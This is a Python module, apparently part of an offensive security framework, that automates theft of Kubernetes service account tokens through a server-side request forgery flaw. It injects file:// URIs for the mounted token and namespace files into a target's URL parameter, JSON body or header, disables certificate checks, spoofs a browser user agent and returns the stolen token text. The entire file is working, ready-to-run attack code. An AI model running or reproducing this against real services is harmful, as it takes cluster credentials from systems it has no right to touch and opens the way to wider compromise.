"""
Execution logic for k8s_sa_token_theft: extracts Kubernetes service account tokens
(and associated namespace metadata) from the local container filesystem via
file:// URI scheme injection in SSRF sinks.

Targets the canonical mounted paths:
- /var/run/secrets/kubernetes.io/serviceaccount/token
- /var/run/secrets/kubernetes.io/serviceaccount/namespace

Strictly bounded: at most 2 HTTP requests per run, non-fatal network handling,
and response size capping. No parsing or decoding logic here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
PLACEHOLDER = "__SSRF__"
VALID_LOCATIONS = ("url_param", "json_body", "header")
MAX_SNIPPET_LEN = 8192

K8S_TOKEN_FILE_URI = "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
K8S_NAMESPACE_FILE_URI = "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"


@dataclass
class HttpExchange:
    step: str
    target_url: str
    injected_url: str
    status_code: Optional[int] = None
    response_text: str = ""
    error: Optional[str] = None


@dataclass
class RawK8sSaTokenResult:
    target: str = ""
    inject_location: str = ""
    exchanges: List[HttpExchange] = field(default_factory=list)
    raw_token_text: str = ""
    raw_namespace_text: str = ""
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t:
        return ""
    if not (t.startswith("http://") or t.startswith("https://")):
        t = f"https://{t}"
    return t


def _dispatch_request(
    target_url: str,
    internal_url: str,
    inject_location: str,
    method: str,
    json_body_template: str,
    header_name: str,
    timeout: int,
) -> HttpExchange:
    """Dispatches a single HTTP request through the specified SSRF sink."""
    exchange = HttpExchange(step="", target_url=target_url, injected_url=internal_url)
    if requests is None:
        exchange.error = "requests library not available"
        return exchange

    req_headers = {"User-Agent": USER_AGENT}
    http_method = (method or "GET").upper()
    data: Optional[str] = None

    if inject_location == "url_param":
        url = target_url.replace(PLACEHOLDER, internal_url)
    elif inject_location == "json_body":
        url = target_url
        req_headers["Content-Type"] = "application/json"
        data = json_body_template.replace(PLACEHOLDER, internal_url)
        http_method = (method or "POST").upper()
    elif inject_location == "header":
        url = target_url
        req_headers[header_name] = internal_url
        if http_method == "POST":
            data = ""
    else:
        exchange.error = f"unsupported inject_location: {inject_location}"
        return exchange

    exchange.target_url = url

    try:
        resp = requests.request(
            method=http_method,
            url=url,
            headers=req_headers,
            data=data,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        exchange.status_code = resp.status_code
        exchange.response_text = resp.text[:MAX_SNIPPET_LEN]
    except requests.RequestException as exc:
        exchange.error = str(exc)

    return exchange


def execute(
    target: str,
    inject_location: str = "url_param",
    method: str = "",
    json_body_template: str = "",
    header_name: str = "",
    timeout: int = 10,
) -> RawK8sSaTokenResult:
    """Main execution entrypoint for Kubernetes service account token theft via SSRF."""
    target_clean = (target or "").strip()
    norm_location = (inject_location or "url_param").strip().lower()

    if requests is None:
        return RawK8sSaTokenResult(
            target=target_clean,
            inject_location=norm_location,
            error="requests library not available",
        )

    if not target_clean:
        return RawK8sSaTokenResult(
            target=target_clean,
            inject_location=norm_location,
            error="empty target URL",
        )

    url = normalize_target_url(target_clean)

    if norm_location not in VALID_LOCATIONS:
        return RawK8sSaTokenResult(
            target=url,
            inject_location=norm_location,
            error=f"inject_location must be one of: {', '.join(VALID_LOCATIONS)}",
        )

    if norm_location == "url_param":
        if PLACEHOLDER not in url:
            return RawK8sSaTokenResult(
                target=url,
                inject_location=norm_location,
                error=f"target URL missing the '{PLACEHOLDER}' placeholder",
            )
    elif norm_location == "json_body":
        if not json_body_template:
            return RawK8sSaTokenResult(
                target=url,
                inject_location=norm_location,
                error="json_body_template is required when inject_location is 'json_body'",
            )
        try:
            json.loads(json_body_template)
        except ValueError:
            return RawK8sSaTokenResult(
                target=url,
                inject_location=norm_location,
                error="json_body_template is not valid JSON",
            )
        if PLACEHOLDER not in json_body_template:
            return RawK8sSaTokenResult(
                target=url,
                inject_location=norm_location,
                error=f"json_body_template missing the '{PLACEHOLDER}' placeholder",
            )
    elif norm_location == "header":
        if not header_name:
            return RawK8sSaTokenResult(
                target=url,
                inject_location=norm_location,
                error="header_name is required when inject_location is 'header'",
            )

    result = RawK8sSaTokenResult(
        target=url,
        inject_location=norm_location,
    )

    # Step 1: Attempt to read the service account token
    token_ex = _dispatch_request(
        target_url=url,
        internal_url=K8S_TOKEN_FILE_URI,
        inject_location=norm_location,
        method=method,
        json_body_template=json_body_template,
        header_name=header_name,
        timeout=timeout,
    )
    token_ex.step = "token_read"
    result.exchanges.append(token_ex)

    if token_ex.status_code == 200 and token_ex.response_text:
        result.raw_token_text = token_ex.response_text.strip()

        # Step 2: Attempt to read the associated namespace
        ns_ex = _dispatch_request(
            target_url=url,
            internal_url=K8S_NAMESPACE_FILE_URI,
            inject_location=norm_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            timeout=timeout,
        )
        ns_ex.step = "namespace_read"
        result.exchanges.append(ns_ex)

        if ns_ex.status_code == 200 and ns_ex.response_text:
            result.raw_namespace_text = ns_ex.response_text.strip()

    return result
